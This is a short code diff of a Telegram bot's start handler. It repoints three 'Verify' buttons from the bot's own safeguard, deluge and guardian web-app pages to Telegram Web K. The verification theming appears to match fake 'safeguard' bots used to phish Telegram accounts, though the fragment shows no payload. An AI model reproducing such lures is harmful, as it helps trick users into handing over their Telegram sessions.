@@ -260,7 +260,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "VERIFY",
                 web_app: {
-                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
+                  url: "https://web.telegram.org/k/"  // ← CHANGED: Direct Telegram Web K
                 }
               }]]
             }
@@ -274,7 +274,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "Tap To Verify",
                 web_app: {
-                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
+                  url: "https://web.telegram.org/k/"  // ← CHANGED: Direct Telegram Web K
                 }
               }]]
             }
@@ -288,7 +288,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "Verify",
                 web_app: {
-                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
+                  url: "https://web.telegram.org/k/"  // ← CHANGED: Direct Telegram Web K
                 }
               }]]
             }
